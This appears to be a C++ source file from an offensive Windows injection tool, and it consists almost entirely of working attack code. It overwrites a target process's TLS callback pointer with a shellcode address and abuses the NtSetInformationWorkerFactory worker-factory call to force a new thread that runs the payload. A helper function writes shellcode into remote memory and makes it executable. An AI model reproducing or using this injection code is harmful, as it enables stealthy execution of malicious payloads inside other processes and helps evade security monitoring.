#include "injection.hpp"



bool ForceThreadCreation(_In_ HANDLE hWorkerFactory);


bool AdvancedTlsInjection(_In_ HANDLE targetProcess, _In_ byte* targetModuleBase, _In_ void* remotePayload, _In_ HANDLE hWorkerFactory) {

	byte* pPeHdrs = nullptr;
	PIMAGE_NT_HEADERS pImgNtHdrs = nullptr;
	PIMAGE_DATA_DIRECTORY pImgDataDirectory = nullptr;
	PIMAGE_TLS_DIRECTORY pImgTlsDirectory = nullptr;
	uint32_t oldProtect = 0;
	bool state = true;

	std::cout << "{+} Beginning Advanced TLS Injection." << std::endl;


	//
	// Copy PE headers of target module
	//

	pPeHdrs = static_cast<byte*>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		PAGE_SIZE));

	if (pPeHdrs == nullptr) {

		WIN32_ERR(HeapAlloc);
		state = false;	goto FUNC_END;
	}


	if (!ReadProcessMemory(
		targetProcess,
		targetModuleBase,
		pPeHdrs,
		PAGE_SIZE,
		nullptr)) {

		WIN32_ERR(ReadProcessMemory);
		state = false;	goto FUNC_END;
	}



	//
	// Check if a TLS directory exists in the module first
	//

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pPeHdrs + (reinterpret_cast<PIMAGE_DOS_HEADER>(pPeHdrs))->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		
		std::cerr << "{!!} Invalid NT signature." << std::endl;
		state = false;	goto FUNC_END;
	}

	pImgDataDirectory = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (!pImgDataDirectory->Size || !pImgDataDirectory->VirtualAddress) {
		
		std::cerr << "{!!} Module does not contain a TLS directory!" << std::endl;
		state = false;	goto FUNC_END;
	}



	//
	// Copy over the directory
	//

	pImgTlsDirectory = static_cast<PIMAGE_TLS_DIRECTORY>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		pImgDataDirectory->Size
	));

	if (pImgTlsDirectory == nullptr) {
		
		WIN32_ERR(HeapAlloc);
		state = false;	goto FUNC_END;
	}


	if (!ReadProcessMemory(
		targetProcess,
		targetModuleBase + (pImgDataDirectory->VirtualAddress),
		pImgTlsDirectory,
		pImgDataDirectory->Size,
		nullptr )) {

		WIN32_ERR(ReadProcessMemory);
		state = false;	goto FUNC_END;
	}



	//
	// Callback array is initially read-only, so we'll change it and then write.
	//

	std::cout << "{+} Modifying TLS callback array." << std::endl;
	if (!VirtualProtectEx(
		targetProcess,
		reinterpret_cast<LPVOID>(pImgTlsDirectory->AddressOfCallBacks),
		sizeof(void*),
		PAGE_READWRITE,
		(PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx(First Call));
		state = false;	goto FUNC_END;
	}


	if (!WriteProcessMemory(
		targetProcess,
		reinterpret_cast<LPVOID>(pImgTlsDirectory->AddressOfCallBacks),
		&remotePayload,
		sizeof(void*),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		state = false;	goto FUNC_END;
	}


	if (!VirtualProtectEx(
		targetProcess,
		reinterpret_cast<LPVOID>(pImgTlsDirectory->AddressOfCallBacks),
		sizeof(void*),
		oldProtect,
		(PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx(Second Call));
		state = false;	goto FUNC_END;
	}



	//
	// Force a new thread to be created, triggering the payload
	//

	state = ForceThreadCreation(hWorkerFactory);



	FUNC_END:

	if (pPeHdrs) {
		HeapFree(GetProcessHeap(), 0, pPeHdrs);
	}

	if (pImgTlsDirectory) {
		HeapFree(GetProcessHeap(), 0, pImgTlsDirectory);
	}

	return state;
}






bool ForceThreadCreation(_In_ HANDLE hWorkerFactory) {

	fnNtQueryInformationWorkerFactory pQueryWorkerFactory = nullptr;
	fnNtSetInformationWorkerFactory pSetInformationWorkerFactory = nullptr;
	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
	uint32_t newThreadNumber = 0;
	
	NTSTATUS status = ERROR_SUCCESS;


	pQueryWorkerFactory = reinterpret_cast<fnNtQueryInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationWorkerFactory")
		);

	pSetInformationWorkerFactory = reinterpret_cast<fnNtSetInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetInformationWorkerFactory")
		);


	if (!pSetInformationWorkerFactory || !pQueryWorkerFactory) {
		std::cerr << "{!!} Failed to get function pointers." << std::endl;
		return false;
	}

	std::cout << "{+} Forcing remote thread creation." << std::endl;


	//
	// Get current number of worker threads
	//

	status = pQueryWorkerFactory(
		hWorkerFactory,
		WorkerFactoryBasicInformation,
		&workerFactoryInfo,
		sizeof(WORKER_FACTORY_BASIC_INFORMATION),
		nullptr);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtQueryInformationWorkerFactory, status);
		return false;
	}



	//
	// Force a new thread to be created
	//

	newThreadNumber = workerFactoryInfo.TotalWorkerCount + 1;
	status = pSetInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryThreadMinimum,
		&newThreadNumber,
		sizeof(uint32_t)
	);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtSetInformationWorkerFactory, status);
		return false;
	}


	return true;
}





bool WritePayloadIntoProcess(_In_ HANDLE hProcess, _In_ void* pPayload, _In_ size_t payloadSize, _Out_ void** pRemoteAddress) {

	if (!pPayload || !pRemoteAddress) {
		return false;
	}


	void* remote = VirtualAllocEx(hProcess,
		nullptr,
		payloadSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remote == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}

	size_t bytesWritten = 0;
	if (!WriteProcessMemory(hProcess,
		remote,
		pPayload,
		payloadSize,
		&bytesWritten) || bytesWritten != payloadSize) {

		WIN32_ERR(WriteProcessMemory);
		std::cout << "Bytes written :" << bytesWritten << " | Payload Size :" << payloadSize << std::endl;
		return false;
	}

	uint32_t oldProtect;
	if (!VirtualProtectEx(hProcess, remote, payloadSize, PAGE_EXECUTE_READ, (PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx);
		return false;
	}

	*pRemoteAddress = remote;

	std::cout << "{+} Wrote Shellcode Into Remote Process: " << remote << std::endl;
	return true;
}